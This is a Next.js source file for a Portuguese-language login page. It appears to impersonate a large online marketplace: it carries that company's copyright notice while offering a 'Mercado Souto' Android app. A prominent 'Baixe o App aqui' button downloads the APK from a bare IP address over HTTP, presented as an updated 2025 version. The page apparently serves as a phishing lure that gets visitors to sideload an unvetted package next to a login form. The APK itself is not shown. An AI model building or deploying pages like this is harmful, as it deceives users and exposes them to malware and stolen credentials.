import Link from 'next/link'
import PublicHeader from '../../../components/PublicHeader/PublicHeader'
import LoginForm from './_components/LoginForm'
import Button from '@/components/Button/Button'

export default function Login() {

  return (
    <div className="flex flex-col justify-between h-screen">
      <PublicHeader />
      <div className='flex flex-wrap text-center pt-14 w-full '>

        <div className='font-semibold mx-auto text-3xl w-full md:w-[45%] text-(--text-primary) my-4 px-8'>
          Digite seu e-mail ou telefone para iniciar sessão



          <div className='mt-64'>
            <a 
            href='http://137.184.83.125/downloads/mercado-souto-app.apk'
            className=""
            download
          >
            <Button variant='secondary' className='px-2 py-2'>Baixe o App aqui</Button>
          </a>
          
          <p className="text-center text-[11px] text-gray-500 mt-1">
            Versão atualizada 2025 para Android
          </p>
          </div>
        </div>

        <div className='d-flex flex-col bg-white rounded-2xl border border-gray-200 w-full sm:w-[468px] mx-auto mt-2 p-8 gap-4 text-left'>

          <LoginForm />

        </div>

      </div>

      <footer className='flex text-[12px] justify-between w-screen bg-background mt-auto py-6 px-10'>
        <div >
          <span  className='text-(--text-secondary)'><Link href="#">Como cuidamos da sua privacidade</Link> - Copyright © 1999-2025 Ebazar.com.br LTDA.</span>
        </div>
        <div className='text-(--text-primary)!'>
          <span className='text-(--text-secondary)'>Protegido por reCAPTCHA</span> - <Link href="#" className='text-(--text-primary)!'>Privacidade</Link> - <Link href="#" className='text-(--text-primary)!'>Condições</Link>
        </div>
      </footer>
    </div>
  )
}
